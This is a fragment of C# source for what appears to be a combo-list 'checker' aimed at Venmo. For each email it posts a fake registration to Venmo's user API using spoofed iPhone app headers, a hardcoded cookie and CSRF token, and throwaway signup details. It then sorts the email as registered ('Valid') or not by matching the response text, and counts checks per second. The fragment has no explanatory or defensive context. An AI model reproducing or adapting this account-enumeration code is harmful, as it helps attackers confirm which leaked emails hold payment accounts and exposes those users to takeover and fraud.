        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    request.AddHeader("Accept-Encoding", "gzip;q=1.0,compress;q=0.5");
                    request.AddHeader("Accept-Language", "en;q=1.0");
                    request.AddHeader("Connection", "keep-alive");
                    request.AddHeader("Content-Type", "application/json; charset=utf-8");
                    request.AddHeader("Cookie", "_ga=GA1.2.453959070.1615414633; _gid=GA1.2.1712070821.1615414633; v_id=C1C44DE8-A0F6-4611-8C25-01B4D9B7B81F; csrftoken2=06395a29f5fa4582b7f18f2d4bef91ec");
                    request.AddHeader("User-Agent", "Venmo/8.17.0 (iPhone; iOS 12.1; Scale/3.0)");
                    string check = request.Post("https://api.venmo.com/v1/users", "{\"client_id\":\"1\",\"email\":\"" + credentials[0] + "\",\"phone_number\":\"(270) 971-4163\",\"first_name\":\"Man\",\"last_name\":\"Luver\",\"password\":\"Milly$06\"}", "application/json").ToString();
                    if (check.Contains("That email is already registered in our system"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (check.Contains("To use Venmo, we need your mobile phone number"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
